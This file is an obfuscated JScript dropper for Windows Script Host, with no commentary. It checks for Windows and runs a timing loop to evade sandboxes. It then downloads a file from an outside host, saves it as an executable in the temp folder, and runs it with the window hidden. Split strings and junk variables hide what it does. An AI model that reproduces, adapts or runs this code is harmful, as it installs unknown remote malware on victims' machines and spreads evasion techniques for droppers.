var VU = false;
var GK = "Create"+"Object";
var IT = function B() {return WScript[GK]("WScript"+".Shell");}(), FZ = 11;
var RZ = "MSXML2"+".XMLHTTP";
var XP = 2;
var YV = XP - 2;
function G(Z){IT["Run"](Z, YV, YV);};
function NR(){return RZ + "";};
function EO(ZF, XT){YV = YV * 1; return ZF - XT;};
function AD(){return GK;};
/*@cc_on
  @if (@_win32 || @_win64)
    VU = true;
  @end
@*/
if (VU)
{
var NY = "";
function Q(){return 22;};
var CD = 0; var X0 = 0;
function QO()
{
var SB = new this["Date"]();
var MJ = SB["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var SB = new this["Date"]();
var X = SB["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var SB = new this["Date"]();
var Q0 = SB["getUTCMilliseconds"]();
var CD = "JY";
CD = EO(X, MJ);
var X0 = "TD";
X0 = EO(Q0, X);
NY = "open";
return EO(CD, X0);
}
var L = false;
var B1 = false;
for (var E = YV; E < Q() * 1; E++){if (QO() != YV){
L = true; 
X0 = "31" + 11 * CD + X0; 
B1 = true; 
break;
}}
function CN() {return ((L == true) && (L == B1)) ? 1 : YV;};
if (L && CN() && B1){
function O() {return IT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ge6eGn2PJww.ex" + "e";};
 IX = NR();
 NF = WScript[GK](IX);
 var G0 = 1;
do { 
	for (;G0;){
	try {
		if (G0 == 1)
		{
			NF[NY]("GET", "http://arcfestoheni.hu/n3usad", false);
			NF["send"]();
			B0 = "Sleep";
			G0 = 2;
		}
		WScript[B0](Q() + 120); 
		if (NF["readystate"] < 2 * 2) continue;
		G0 = YV;
		function YZ(VR) {var YF = (1, 2, 3, 4, 5, VR); return YF;};
		AC = WScript[AD()]("ADODB.Stream");
		IX = AC;
		IX[NY]();
		IX["type"] = YZ(1);
		IX["write"](NF["ResponseBody"]);
		AC["position"] = YZ(YV);
		IX["Save" + "ToFile"](O(), 2);
		AC["cl"+"ose"]();
		D = O();
		G(D);
	} catch(M){};};
}while (G0);
}
}

